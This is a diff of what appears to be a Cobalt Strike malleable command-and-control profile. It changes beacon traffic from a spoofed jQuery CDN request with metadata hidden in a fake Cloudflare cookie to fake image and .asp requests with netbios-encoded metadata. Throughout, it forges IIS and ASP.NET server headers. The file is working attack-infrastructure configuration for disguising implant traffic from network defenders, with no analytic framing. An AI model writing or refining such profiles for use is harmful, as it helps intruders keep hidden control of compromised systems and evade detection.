@@ -23,27 +23,25 @@ dns-beacon {
 
 http-get {
 
-    set uri "/pixel";
+    set uri "/image/";
 
     client {
 
         header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*l;q=0.8";
         header "Referer" "http://www.google.com";
-        header "Host" "code.jquery.com";
         header "Pragma" "no-cache";
         header "Cache-Control" "no-cache";
-        header "Connection" "Keep-Alive";
 
         metadata {
-           base64url;
-           prepend "__cfduid=";
-           header "Cookie";
-        }   
+            netbios;
+            append "-.jpg";
+            uri-append;
+        }
     }
 
     server {
 
-        header "Content-Type" "application/javascript; charset=utf-8";
+        header "Content-Type" "img/jpg";
         header "Server" "Microsoft-IIS/6.0";
         header "X-Powered-By" "ASP.NET";
 
@@ -55,7 +53,7 @@ http-get {
 }
 
 http-post {
-    set uri "/submit.php";
+    set uri "/history/";
 
     client {
 
@@ -63,14 +61,11 @@ http-post {
         header "Referer" "http://www.google.com";
         header "Pragma" "no-cache";
         header "Cache-Control" "no-cache";
-        header "Connection" "Keep-Alive";
-        header "Accept-Encoding" "gzip, deflate";
-
 
         id {
-             mask;       
-            base64url;
-            parameter "id"; 
+            netbiosu;
+            append ".asp";
+            uri-append;
         }
 
         output {
@@ -81,12 +76,9 @@ http-post {
 
     server {
 
-        header "Content-Type" "application/javascript; charset=utf-8";
+        header "Content-Type" "img/jpg";
         header "Server" "Microsoft-IIS/6.0";
         header "X-Powered-By" "ASP.NET";
-        header "Connection" "keep-alive";
-        header "Pragma" "no-cache";
-        header "Cache-Control" "no-cache";
 
         output {
             base64;
